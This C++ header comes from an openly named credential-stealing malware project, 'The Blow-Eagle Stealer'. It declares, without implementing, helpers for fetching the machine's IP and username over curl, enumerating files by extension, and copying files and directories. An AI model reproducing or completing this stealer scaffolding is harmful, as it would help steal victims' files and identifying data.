/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

#include <Lmcons.h>
#include <Windows.h>
#include <string.h>
#include <direct.h>
#include <filesystem>
#include <iostream>
#include <curl\curl.h>
#include <string>

namespace func
{
	/// <summary>
	/// WriteCallback for curl
	/// </summary>
	/// <param name="contents"></param>
	/// <param name="size"></param>
	/// <param name="nmemb"></param>
	/// <param name="output"></param>
	/// <returns>size_t totalSize</returns>
	size_t WriteCallback(char* contents, size_t size, size_t nmemb, std::string* output);

	/// <summary>
	/// get scurent pc ip using curl
	/// </summary>
	/// <returns>std::string ip</returns>
	std::string GetIP();

	/// <summary>
	/// gets curent pc user
	/// </summary>
	/// <returns>std::string user</returns>
	std::string GetUser();

	/// <summary>
	/// finds all files in directory and adds them to filePaths
	/// </summary>
	/// <param name="directory"></param>
	/// <param name="filePaths"></param>
	/// <param name="ext"></param>
	void GetFilePaths(const std::string& directory, std::vector<std::string>& filePaths, std::string ext);

	/// <summary>
	/// copy dir from sourceDir to destinationDir
	/// </summary>
	/// <param name="sourceDir"></param>
	/// <param name="destinationDir"></param>
	void copyDirectory(const std::filesystem::path& sourceDir, const std::filesystem::path& destinationDir);

	/// <summary>
	/// copy file from sourcePath to destinationPath
	/// </summary>
	/// <param name="sourceDir"></param>
	/// <param name="destinationDir"></param>
	void copyFile(const std::string& sourcePath, const std::string& destinationPath);

	/// <summary>
	/// finds all files in directory and adds them to arr
	/// </summary>
	/// <param name="directoryPath"></param>
	/// <param name="arr"></param>
	/// <param name="arrSize"></param>
	void GetFilesInDir(std::string directoryPath, std::string*& arr, int& arrSize);

	/// <summary>
	/// finds all dirs in directory and adds them to arr
	/// </summary>
	/// <param name="directoryPath"></param>
	/// <param name="arr"></param>
	/// <param name="arrSize"></param>
	void GetDirectories(const std::string& directoryPath, std::string*& arr, int& arrSize);
}